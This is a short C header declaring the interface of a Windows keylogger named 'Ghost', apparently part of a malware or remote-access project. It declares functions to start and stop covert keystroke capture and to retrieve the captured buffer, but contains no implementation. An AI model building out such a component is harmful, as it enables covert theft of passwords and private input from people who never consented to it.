#ifndef GHOST_KEYLOGGER_H
#define GHOST_KEYLOGGER_H

#include <windows.h>

/**
 * Start the keylogger in a separate thread.
 * Captures keystrokes until Keylogger_Stop is called.
 * 
 * @return TRUE if started successfully
 */
BOOL Keylogger_Start(void);

/**
 * Stop the keylogger thread.
 */
void Keylogger_Stop(void);

/**
 * Get the captured keystrokes buffer.
 * Allocates memory which must be freed by the caller.
 * Clears the internal buffer after copying.
 * 
 * @param buffer Pointer to receive the allocated buffer
 * @param size Pointer to receive the size
 * @return TRUE if successful
 */
BOOL Keylogger_GetBuffer(char** buffer, DWORD* size);

/**
 * Check if keylogger is currently running.
 */
BOOL Keylogger_IsRunning(void);

#endif // GHOST_KEYLOGGER_H
